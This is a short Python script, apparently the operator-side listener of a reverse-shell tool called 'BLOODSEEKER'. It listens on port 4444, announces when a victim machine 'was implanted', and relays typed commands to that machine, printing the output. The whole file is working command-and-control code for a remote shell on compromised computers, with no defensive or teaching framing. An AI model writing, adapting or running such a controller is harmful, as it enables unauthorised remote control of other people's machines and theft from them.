import socket

LOCALHOST = '0.0.0.0'
LOCAL_PORT = 4444

serv_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serv_connection.bind((LOCALHOST, LOCAL_PORT))
serv_connection.listen(5)

client, addr = serv_connection.accept()
target_ip = client.recv(4096).decode()
target_info = client.recv(4096).decode()

if client:
    print('\n' + '[*] ' + str(target_ip) + ' BLOODSEEKER WAS IMPLANTED!')
    print(str(target_info))
    if addr:
        print('[*] Connection Success!\n')
else:
    pass

while True:
    BUFFERSIZE = 4096
    command = str(input('BLOODSEEKER >  '))
    client.send(command.encode())
    if command.lower() == 'exit':
        break
    result_output = client.recv(BUFFERSIZE).decode()
    print(result_output)
client.close()
serv_connection.close()
